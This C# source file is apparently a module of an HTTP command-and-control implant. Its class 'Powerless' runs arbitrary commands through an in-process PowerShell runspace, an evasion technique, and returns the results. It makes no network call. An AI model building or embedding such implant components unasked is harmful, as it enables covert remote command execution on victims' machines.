using System;
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace HTTPImplant.Modules
{
    class Powerless
    {
        public static string Exec(string command)
        {
            Console.WriteLine("\n\nRunning " + command);
            string output = "";

            using (PowerShell ps = PowerShell.Create())
            {
                ps.AddCommand(command);
                try
                {
                    Collection<PSObject> results = ps.Invoke();
                    if (ps.Streams.Error.Count > 0)
                    {
                        foreach (var error in ps.Streams.Error)
                        {
                            output += "PowerShell Error: " + error.ToString() + "\n";
                        }
                    }

                    foreach (PSObject result in results)
                    {
                        output += result.ToString() + "\n";
                    }
                }
                catch (Exception e)
                {
                    output += "Error while executing the command.\r\n" + e.Message + "\n";
                }
            }

            return output;
        }
    }
}
